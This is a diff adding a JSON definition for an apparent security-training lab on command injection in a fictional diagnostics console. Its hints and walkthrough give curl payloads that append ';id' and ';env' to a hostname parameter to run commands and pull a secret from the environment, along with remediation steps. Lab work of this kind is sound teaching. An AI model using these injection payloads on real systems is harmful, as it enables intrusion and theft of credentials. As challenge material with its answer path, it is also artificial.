@@ -1,0 +1,147 @@
+{
+  "schemaVersion": 1,
+  "id": "cmdi-netcheck",
+  "version": "1.0.0",
+  "status": "published",
+  "title": "Shellshock at the Edge",
+  "subtitle": "Command injection in Torrential's diagnostics console",
+  "category": "Web Security",
+  "difficulty": "Intermediate",
+  "estimatedMinutes": 25,
+  "skills": [
+    "Command injection",
+    "Shell semantics",
+    "Node.js child_process",
+    "Input validation"
+  ],
+  "summary": "Torrential's edge diagnostics interpolate a customer hostname into a shell command. Escape the argument, capture the diagnostic secret, then remove the shell entirely.",
+  "scenario": "Field engineers diagnose DNS problems from a shared web console. The hostname goes straight into a shell string. Prove code execution, retrieve the support secret, and rebuild the call so no shell is involved.",
+  "prerequisites": [
+    "curl",
+    "Comfort with shell metacharacters"
+  ],
+  "learningObjectives": [
+    "Recognise command injection in a query parameter",
+    "Use shell metacharacters to run additional commands",
+    "Replace shell invocation with argument-array execution"
+  ],
+  "authorizedScope": "Only the Torrential training console in this session.",
+  "riskSummary": "Command injection gives an attacker the service account, its environment and any mounted credentials \u2014 usually a direct path to lateral movement.",
+  "remediation": "Never build shell strings from input. Use argument arrays (execFile/spawn), validate hostnames with a strict pattern, and run services with least privilege.",
+  "conclusion": "You escaped the hostname argument into a shell and read the diagnostic secret, then fixed the call so metacharacters are inert.",
+  "baseXp": 140,
+  "workspace": {
+    "image": "cipherforge/workspace:1.2.0",
+    "tools": [
+      "curl",
+      "jq",
+      "python3",
+      "labctl",
+      "getent"
+    ]
+  },
+  "services": [
+    {
+      "name": "app",
+      "role": "target",
+      "app": "cmdi-netcheck/app/server.mjs",
+      "ports": [
+        {
+          "port": 8080,
+          "protocol": "http",
+          "published": true,
+          "name": "web"
+        }
+      ],
+      "health": {
+        "kind": "http",
+        "path": "/api/health",
+        "expectStatus": 200,
+        "expectBody": "torrential-netcheck",
+        "timeoutSeconds": 30
+      },
+      "flagObjectives": [
+        "shell-flag"
+      ]
+    }
+  ],
+  "resources": {
+    "cpus": 0.5,
+    "memoryMb": 320,
+    "pids": 96,
+    "writableDiskMb": 64,
+    "maxMinutes": 45,
+    "idleTimeoutMinutes": 20
+  },
+  "network": {
+    "outbound": "deny",
+    "internalPorts": [
+      8080
+    ]
+  },
+  "objectives": [
+    {
+      "id": "shell-flag",
+      "title": "Escape the hostname argument",
+      "description": "Inject a command separator into the host parameter to print the service environment and submit the diagnostic secret.",
+      "validation": {
+        "type": "flag",
+        "objectiveKind": "flag",
+        "xp": 55
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "`curl -s \"$CF_TARGET_URL/api/netcheck?host=localhost;env\"` \u2014 encode the semicolon if your shell needs it.",
+          "xpPenalty": 5
+        }
+      ]
+    },
+    {
+      "id": "no-shell",
+      "title": "Remove the shell",
+      "description": "Apply the policy that switches the endpoint to argument-array execution. The live check confirms metacharacters no longer execute while normal lookups still resolve.",
+      "validation": {
+        "type": "check",
+        "objectiveKind": "check",
+        "xp": 65,
+        "validator": "shell-injection-blocked",
+        "criteria": [
+          "metacharacters do not leak the secret",
+          "normal hostname lookup still returns output"
+        ]
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Apply `{\"shellDisabled\": true}` with `labctl policy apply -`.",
+          "xpPenalty": 5
+        }
+      ]
+    }
+  ],
+  "validators": [
+    "shell-injection-blocked"
+  ],
+  "provisioner": {
+    "script": "cmdi-netcheck/provision.mjs",
+    "timeoutSeconds": 45
+  },
+  "walkthrough": [
+    {
+      "title": "Confirm injection",
+      "body": "A semicolon separates the hostname from a second command.",
+      "snippet": "curl -sG \"$CF_TARGET_URL/api/netcheck\" --data-urlencode \"host=localhost;id\" | jq -r .output"
+    },
+    {
+      "title": "Read the secret",
+      "body": "The diagnostic environment carries the support secret.",
+      "snippet": "curl -sG \"$CF_TARGET_URL/api/netcheck\" --data-urlencode \"host=localhost;env\" | jq -r .output | grep DIAG_SECRET"
+    },
+    {
+      "title": "Remove the shell",
+      "body": "Switch to execFile so arguments cannot be reinterpreted.",
+      "snippet": "echo '{\"shellDisabled\": true}' | labctl policy apply -"
+    }
+  ]
+}
